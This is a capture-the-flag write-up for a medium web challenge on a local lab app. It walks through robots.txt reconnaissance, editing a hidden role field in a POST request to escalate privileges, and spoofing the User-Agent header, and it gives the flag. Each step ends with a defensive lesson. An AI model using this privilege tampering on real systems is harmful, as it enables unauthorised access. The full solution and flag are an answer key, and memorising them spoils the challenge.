# Flight SK-777: The Dispatch Bridge (Writeup)

> **Release after the event ends.** This writeup contains the full solution. Players should receive `CHALLENGE_DESCRIPTION.md` during the event.

**Category:** Web Exploitation 
**Difficulty:** Medium


Tools: a browser plus Burp Suite (Proxy, Repeater). `curl` also works for every step.

---

## The scenario

You are a cabin crew member on SK-102. Your objective is the classified briefing
for the heavy-cargo flight SK-777, served by the Webex dispatch service.

---

## Step 1: Reconnaissance

Request `/robots.txt`:

```
User-agent: *
Disallow: /flight-manifests/
```

`robots.txt` lists the directory the operators don't want crawled. Open
`/flight-manifests/`. It is a directory index with two files:
`manifest_SK102.json` and `manifest_SK777.json`.

**Lesson:** `robots.txt` is a list of paths the site owner wants hidden. It is
reconnaissance, not access control.

---

## Step 2: Read the target manifest

`/flight-manifests/manifest_SK777.json` contains:

```json
{
  "flight_number": "SK-777",
  "status": "RESTRICTED_CARGO",
  "required_role": "flight_captain",
  "required_user_agent": "Webex-Desktop-Pro/2.0"
}
```

Two requirements follow:

1. You need the role `flight_captain` to read SK-777.
2. The briefing endpoint checks the `User-Agent` header against `Webex-Desktop-Pro/2.0`.

---

## Step 3: Escalate your role

The dashboard shows **Target Briefing Initialization** with one option,
**SK-102 (Local Passenger)**. The form sends two fields: `flight_id` (from the
dropdown) and `role` (a hidden field set to `cabin_crew`).

Turn on Burp's Intercept and click **Execute Sync Protocol**. The request is:

```http
POST /api/v1/session/select-flight HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

flight_id=SK-102&role=cabin_crew
```

The server decides your role and flight from these fields. It never checks that
your account is allowed to hold them. This is broken access control: the
server trusts client-supplied privilege values.

Edit the body in Repeater or Intercept:

```http
flight_id=SK-777&role=flight_captain
```

Forward it. The server responds with a redirect to the dashboard. Reload the
dashboard: the role badge reads **flight captain**, and a new panel appears:
**RESTRICTED CARGO CLEARANCE GRANTED** with an **ACCESS CLASSIFIED BRIEFING**
button.

**Lesson:** never accept privilege fields (role, owner, is_admin) from the
client. The server must look up what the user is allowed to do.

---

## Step 4: Spoof the client application

Click **ACCESS CLASSIFIED BRIEFING**. The request is:

```http
GET /api/v1/webex/briefing/SK-777 HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

The response is a 403:

```json
{"error": "Forbidden", "message": "Access restricted. You must use the official Webex Desktop application."}
```

In Burp, replace the `User-Agent` header with the value from the manifest:

```http
GET /api/v1/webex/briefing/SK-777 HTTP/1.1
Host: localhost:8080
User-Agent: Webex-Desktop-Pro/2.0
```

Forward it. The response contains the flag:

```json
{
  "status": "success",
  "clearance": "verified",
  "briefing_data": "Flight SK-777 cleared for pushback. Cargo verified. FLAG: kernel{sk777_h34d3r_sp00f_c4ptain}"
}
```

**Lesson:** the `User-Agent` header is set by the client. A server check on it
is not a security control. Anything the client sends can be changed.

---

## Dead ends

- **Ordering of checks.** The briefing endpoint checks your session first. Until
  both the flight (SK-777) and the role (`flight_captain`) are set, you get
  "Session mismatch" or "Captain role required" instead of the user-agent message.
  Those messages mean you still need Step 3.
- **Invalid roles.** Sending an unknown role returns the list of valid roles.
  Use it to confirm the role name, not to guess it.
- **Unknown flights.** Flights other than SK-102 and SK-777 return "not found".

---

**Flag:** `kernel{sk777_h34d3r_sp00f_c4ptain}`
